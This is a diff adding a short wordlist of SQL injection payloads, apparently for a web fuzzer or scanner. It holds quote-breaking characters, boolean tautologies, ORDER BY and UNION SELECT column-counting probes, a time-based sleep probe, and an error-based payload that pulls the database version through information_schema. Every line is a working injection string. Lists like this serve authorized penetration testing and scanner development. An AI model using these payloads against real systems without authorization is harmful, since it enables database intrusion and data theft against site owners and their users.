@@ -1,0 +1,29 @@
+'
+"
+')
+")
+'))
+"))
+`
+`)
+`))
+\
+%27
+%22
+1' and '1'='1
+1' and '1'='2
+1' and 1=1--
+1' and 1=2--
+1' or '1'='1
+1' or '1'='2
+1' or 1=1--
+1' or 1=2--
+1' order by 1--
+1' order by 100--
+1' union select 1--
+1' union select 1,2--
+1' union select 1,2,3--
+1' union select 1,2,3,4--
+1' union select 1,2,3,4,5--
+1' and sleep(5)--
+1' and (select 1 from(select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)--
